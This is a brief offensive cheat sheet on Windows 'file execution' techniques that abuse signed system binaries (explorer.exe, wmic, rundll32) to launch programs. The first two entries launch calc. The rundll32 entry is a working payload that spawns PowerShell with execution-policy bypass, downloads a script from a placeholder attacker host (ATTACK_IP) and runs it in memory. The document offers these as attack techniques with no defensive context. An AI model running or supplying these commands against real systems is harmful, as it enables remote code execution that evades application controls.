# File Execution

### Tools: File explorer, wmic, rundll32

## FILE EXPLORER

#### 1) 

    explorer.exe /root,"C:\windows\system32\calc.exe

## WMIC

#### 1) 

    wmic.exe process call create calc

## RUNDLL32

#### 1) 

    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();new%20ActiveXobject("WScript.Shell").Run("Powershell -nop -exec bypass -c IEX(New-ObjectNet.WebClient).DownloadString('http://ATTACK_IP/script.ps1');");
